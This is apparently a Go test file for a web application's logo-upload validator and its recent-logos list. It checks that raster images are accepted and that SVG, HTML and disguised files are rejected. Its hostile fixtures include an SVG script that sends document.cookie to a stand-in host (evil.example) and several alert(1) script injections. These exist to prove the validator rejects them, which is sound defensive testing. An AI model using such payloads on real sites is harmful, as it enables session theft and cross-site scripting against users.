// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Kenneth Blossom

// In-package tests for the instance-logo validator and the
// recent-list MRU rules (#517). No database — these are the pure
// parts, and they are the parts that decide what hostile input can
// reach storage, so they should be cheap enough to always run.

package sysconfig

import (
	"bytes"
	"errors"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"strings"
	"testing"
)

// pngBytes encodes a w×h opaque PNG.
func pngBytes(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.Set(x, y, color.RGBA{R: 0xE8, G: 0x62, B: 0x2C, A: 0xFF})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("encode png: %v", err)
	}
	return buf.Bytes()
}

func jpegBytes(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, nil); err != nil {
		t.Fatalf("encode jpeg: %v", err)
	}
	return buf.Bytes()
}

func gifBytes(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewPaletted(image.Rect(0, 0, w, h), color.Palette{color.Black, color.White})
	var buf bytes.Buffer
	if err := gif.Encode(&buf, img, nil); err != nil {
		t.Fatalf("encode gif: %v", err)
	}
	return buf.Bytes()
}

// TestValidateLogoAcceptsRasterFormats confirms each allowlisted
// format round-trips and, crucially, that the content type comes back
// derived from the bytes.
func TestValidateLogoAcceptsRasterFormats(t *testing.T) {
	cases := []struct {
		name     string
		body     []byte
		wantMIME string
	}{
		{"png", pngBytes(t, 128, 64), "image/png"},
		{"jpeg", jpegBytes(t, 64, 64), "image/jpeg"},
		{"gif", gifBytes(t, 32, 32), "image/gif"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, meta, err := ValidateLogo(bytes.NewReader(c.body))
			if err != nil {
				t.Fatalf("ValidateLogo: %v", err)
			}
			if meta.ContentType != c.wantMIME {
				t.Errorf("ContentType = %q, want %q", meta.ContentType, c.wantMIME)
			}
			if meta.SizeBytes != int64(len(c.body)) {
				t.Errorf("SizeBytes = %d, want %d", meta.SizeBytes, len(c.body))
			}
			if meta.Width == 0 || meta.Height == 0 {
				t.Errorf("dimensions not populated: %dx%d", meta.Width, meta.Height)
			}
			if _, ok := allowedLogoMIME[meta.ContentType]; !ok {
				t.Errorf("validator produced a content type outside its own allowlist: %q", meta.ContentType)
			}
		})
	}
}

// TestValidateLogoReturnsExactBytes — the bytes handed to storage must
// be the bytes we validated, not a re-encode. A re-encode would mean
// the thing we proved safe is not the thing we serve.
func TestValidateLogoReturnsExactBytes(t *testing.T) {
	in := pngBytes(t, 64, 64)
	out, _, err := ValidateLogo(bytes.NewReader(in))
	if err != nil {
		t.Fatalf("ValidateLogo: %v", err)
	}
	if !bytes.Equal(in, out) {
		t.Errorf("returned bytes differ from input (%d in, %d out)", len(in), len(out))
	}
}

// TestValidateLogoRejectsSVG is the security-relevant case. SVG is the
// obvious thing an operator will try, and it is an executable document
// format — accepting one without a sanitiser would put script we did
// not write on every page of the install.
func TestValidateLogoRejectsSVG(t *testing.T) {
	svgs := map[string]string{
		"plain": `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><rect width="64" height="64"/></svg>`,
		"with_script": `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">` +
			`<script>fetch('https://evil.example/'+document.cookie)</script></svg>`,
		"with_onload": `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" width="64" height="64"/>`,
		"xml_decl":    `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"/>`,
	}
	for name, body := range svgs {
		t.Run(name, func(t *testing.T) {
			_, _, err := ValidateLogo(strings.NewReader(body))
			if !errors.Is(err, ErrLogoNotAnImage) {
				t.Fatalf("SVG accepted or wrong error: %v", err)
			}
		})
	}
}

// TestValidateLogoRejectsNonImages covers the rest of the hostile-input
// surface: markup, scripts, and a file wearing a PNG magic number.
func TestValidateLogoRejectsNonImages(t *testing.T) {
	pngMagic := []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}

	cases := map[string][]byte{
		"html":            []byte(`<html><body><script>alert(1)</script></body></html>`),
		"empty":           {},
		"plain_text":      []byte("this is not an image"),
		"png_magic_only":  pngMagic,
		"png_magic_junk":  append(append([]byte{}, pngMagic...), []byte("<script>alert(1)</script>")...),
		"truncated_png":   pngBytes(t, 64, 64)[:40],
		"pdf":             []byte("%PDF-1.7\n1 0 obj\n<</Type/Catalog>>\n"),
		"windows_ico":     {0x00, 0x00, 0x01, 0x00, 0x01, 0x00},
		"webmanifest":     []byte(`{"name":"x","icons":[]}`),
		"svg_with_bom":    append([]byte{0xEF, 0xBB, 0xBF}, []byte(`<svg xmlns="http://www.w3.org/2000/svg"/>`)...),
		"tiff_disallowed": {0x49, 0x49, 0x2A, 0x00},
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			if _, _, err := ValidateLogo(bytes.NewReader(body)); err == nil {
				t.Fatal("accepted a non-image body")
			}
		})
	}
}

// TestValidateLogoRejectsOversize — the byte cap must fire before any
// decode work, so a huge body is cheap to refuse.
func TestValidateLogoRejectsOversize(t *testing.T) {
	body := make([]byte, MaxLogoBytes+1)
	copy(body, pngBytes(t, 64, 64))
	_, _, err := ValidateLogo(bytes.NewReader(body))
	if !errors.Is(err, ErrLogoTooLarge) {
		t.Fatalf("err = %v, want ErrLogoTooLarge", err)
	}
}

// TestValidateLogoBoundsDimensions covers both ends, including the
// decompression-bomb shape: a tiny file that declares an enormous
// canvas.
func TestValidateLogoBoundsDimensions(t *testing.T) {
	t.Run("too_small", func(t *testing.T) {
		_, _, err := ValidateLogo(bytes.NewReader(pngBytes(t, MinLogoDim-1, MinLogoDim-1)))
		if !errors.Is(err, ErrLogoDimensions) {
			t.Fatalf("err = %v, want ErrLogoDimensions", err)
		}
	})
	t.Run("too_large", func(t *testing.T) {
		// A uniform image this size compresses to well under the byte
		// cap, so it reaches the dimension check — which is the point:
		// the byte cap alone does NOT bound the pixel budget.
		big := pngBytes(t, MaxLogoDim+1, 32)
		if len(big) > MaxLogoBytes {
			t.Fatalf("fixture is %d bytes, too big to exercise the dimension check", len(big))
		}
		_, _, err := ValidateLogo(bytes.NewReader(big))
		if !errors.Is(err, ErrLogoDimensions) {
			t.Fatalf("err = %v, want ErrLogoDimensions", err)
		}
	})
	t.Run("at_bounds_ok", func(t *testing.T) {
		if _, _, err := ValidateLogo(bytes.NewReader(pngBytes(t, MaxLogoDim, MinLogoDim))); err != nil {
			t.Fatalf("edge-of-range image rejected: %v", err)
		}
	})
}

// ---------------------------------------------------------------
// Recent-list (MRU) rules
// ---------------------------------------------------------------

func logoN(n int) LogoConfig {
	return LogoConfig{
		Hash:        strings.Repeat(string(rune('a'+n)), 64),
		ContentType: "image/png",
		Width:       64,
		Height:      64,
	}
}

func hashesOf(list []LogoConfig) []string {
	out := make([]string, 0, len(list))
	for _, l := range list {
		out = append(out, l.Hash[:1])
	}
	return out
}

func TestPromoteLogoInsertsAtFront(t *testing.T) {
	got, evicted := promoteLogo([]LogoConfig{logoN(0), logoN(1)}, logoN(2))
	if want := []string{"c", "a", "b"}; !equalStrings(hashesOf(got), want) {
		t.Errorf("order = %v, want %v", hashesOf(got), want)
	}
	if len(evicted) != 0 {
		t.Errorf("unexpected eviction: %v", hashesOf(evicted))
	}
}

// TestPromoteLogoMovesExistingWithoutDuplicating is the MRU rule the
// owner asked for: re-selecting something already listed moves it, it
// does not append a second copy.
func TestPromoteLogoMovesExistingWithoutDuplicating(t *testing.T) {
	start := []LogoConfig{logoN(0), logoN(1), logoN(2)}
	got, evicted := promoteLogo(start, logoN(2))
	if want := []string{"c", "a", "b"}; !equalStrings(hashesOf(got), want) {
		t.Errorf("order = %v, want %v", hashesOf(got), want)
	}
	if len(got) != 3 {
		t.Errorf("length changed on a move: %d", len(got))
	}
	if len(evicted) != 0 {
		t.Errorf("a move must not evict, got %v", hashesOf(evicted))
	}
}

// TestPromoteLogoEvictsOldest — the sixth upload pushes the oldest off
// the end, and the caller is told which one so it can drop the pin.
func TestPromoteLogoEvictsOldest(t *testing.T) {
	var start []LogoConfig
	for i := 0; i < MaxLogoHistory; i++ {
		start = append(start, logoN(i))
	}
	got, evicted := promoteLogo(start, logoN(MaxLogoHistory))
	if len(got) != MaxLogoHistory {
		t.Fatalf("list grew past the cap: %d", len(got))
	}
	if want := []string{"f", "a", "b", "c", "d"}; !equalStrings(hashesOf(got), want) {
		t.Errorf("order = %v, want %v", hashesOf(got), want)
	}
	if want := []string{"e"}; !equalStrings(hashesOf(evicted), want) {
		t.Errorf("evicted = %v, want %v — the OLDEST entry must be the one dropped",
			hashesOf(evicted), want)
	}
}

// TestPromoteLogoReselectAtCapEvictsNothing guards the pin-leak shape:
// re-selecting a member of a full list must not silently drop a
// pinned entry.
func TestPromoteLogoReselectAtCapEvictsNothing(t *testing.T) {
	var start []LogoConfig
	for i := 0; i < MaxLogoHistory; i++ {
		start = append(start, logoN(i))
	}
	for i := 0; i < MaxLogoHistory; i++ {
		got, evicted := promoteLogo(start, logoN(i))
		if len(evicted) != 0 {
			t.Errorf("re-selecting entry %d evicted %v", i, hashesOf(evicted))
		}
		if len(got) != MaxLogoHistory {
			t.Errorf("re-selecting entry %d changed the length to %d", i, len(got))
		}
	}
}

// TestActiveLogoEntryFallsBackWhenDangling — chrome renders on every
// page, so a config whose active hash is not in the list must resolve
// to "use the shipped default" rather than error.
func TestActiveLogoEntryFallsBackWhenDangling(t *testing.T) {
	cfg := AppearanceConfig{
		ActiveLogo:  strings.Repeat("z", 64),
		LogoHistory: []LogoConfig{logoN(0)},
	}
	if got := cfg.ActiveLogoEntry(); got != nil {
		t.Errorf("dangling active hash resolved to %+v, want nil", got)
	}
	if got := (AppearanceConfig{}).ActiveLogoEntry(); got != nil {
		t.Errorf("unset config resolved to %+v, want nil (shipped default)", got)
	}
}

// TestFindLogoIsTheMembershipGate — FindLogo is what stops a
// caller-supplied hash from addressing arbitrary storage objects, so
// it must not match anything outside the list.
func TestFindLogoIsTheMembershipGate(t *testing.T) {
	cfg := AppearanceConfig{LogoHistory: []LogoConfig{logoN(0), logoN(1)}}
	if cfg.FindLogo(logoN(0).Hash) == nil {
		t.Error("listed hash not found")
	}
	for _, miss := range []string{"", strings.Repeat("z", 64), logoN(0).Hash[:63], logoN(0).Hash + "a"} {
		if got := cfg.FindLogo(miss); got != nil {
			t.Errorf("FindLogo(%q) matched %+v, want nil", miss, got)
		}
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
